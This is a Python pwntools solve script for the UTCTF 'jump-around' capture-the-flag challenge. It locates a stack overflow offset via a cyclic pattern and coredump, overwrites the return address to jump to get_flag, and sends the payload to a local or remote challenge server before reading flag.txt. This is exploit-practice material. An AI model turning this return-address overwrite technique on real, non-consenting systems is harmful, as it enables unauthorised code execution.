#!/usr/bin/env python3
'''
WhatTheFuzz's submission for the UTCTF challenge jump-around.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
'''

from pwn import *

exe = ELF('jump')

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

NUM_CYCLIC_BYTES = 1000


def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('pwn.utctf.live', 5001)

    else:
        io = process([exe.path])

    return io


def find_offset():
    '''Send crashing input to the program. Open the coredump and check where
    the faulting address is.
    Returns the offset as an interger.
    '''

    conn = process([exe.path])
    pattern = cyclic(length=NUM_CYCLIC_BYTES, n=exe.bytes)

    # Send the pattern to the program.
    conn.sendline(pattern)

    # The program will crash. Inspect the coredump.
    conn.wait()
    core = conn.corefile

    # Ensure that our faulting address is some substring of the cyclic pattern.
    assert pack(
        core.fault_addr) in pattern, 'Faulting address not in cyclic pattern.'

    # Get the offset to the fauting address inside our pattern.
    offset = cyclic_find(pack(core.fault_addr), n=exe.bytes)
    return offset


def create_payload(offset):
    '''Create the payload using the provided offset.
    '''

    # Search the executable for the function that opens a shell.
    function_to_call = exe.symbols['get_flag']

    # Add that function where the offset is in our payload. This will overwrite
    # the return address. When the function epilogue runs, the return address
    # will be loaded into the instruction pointer.
    payload = fit({offset: function_to_call})

    return payload


def main():
    '''Return the flag.
    '''

    offset = find_offset()
    log.info(f'The offset to the faulting address is {offset}.')

    with conn() as io:

        # Create the payload.
        payload = create_payload(offset)

        # Send the payload to the program. This will open a shell.
        io.sendline(payload)

        io.sendline(b'cat flag.txt')
        flag = io.recvlineS(keepends=False)
        log.success(f'The flag is: {flag}')
        return flag


if __name__ == '__main__':
    main()
